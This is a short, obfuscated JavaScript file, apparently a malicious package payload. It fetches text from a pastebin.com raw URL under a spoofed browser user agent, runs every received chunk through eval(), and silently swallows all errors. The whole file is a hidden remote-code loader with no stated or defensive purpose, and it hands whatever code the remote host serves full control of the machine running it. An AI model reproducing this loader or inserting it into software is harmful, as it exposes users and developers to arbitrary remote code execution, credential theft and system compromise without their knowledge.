function _0xd1d4(_0x3cbf97, _0xaff5e2) {
  var _0xd1d498 = _0xaff5();
  _0xd1d4 = function (_0x3c7b7c, _0x208269) {
    _0x3c7b7c = _0x3c7b7c - 344;
    var _0x2a4761 = _0xd1d498[_0x3c7b7c];
    return _0x2a4761;
  };
  return _0xd1d4(_0x3cbf97, _0xaff5e2);
}
try {
  var https = require("https");
  https.get({hostname: "pastebin.com", path: "/raw/XLeVP82h", headers: {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0", Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}}, _0x348957 => {
    var _0x41f99c = _0xd1d4;
    _0x348957[_0x41f99c(344)]("utf8");
    _0x348957.on("data", _0x478d82 => {
      eval(_0x478d82);
    });
    _0x348957.on("error", () => {});
  }).on("error", () => {});
} catch (_0x54d150) {}
function _0xaff5() {
  var _0x3a03db = ["setEncoding"];
  _0xaff5 = function () {
    return _0x3a03db;
  };
  return _0xaff5();
}

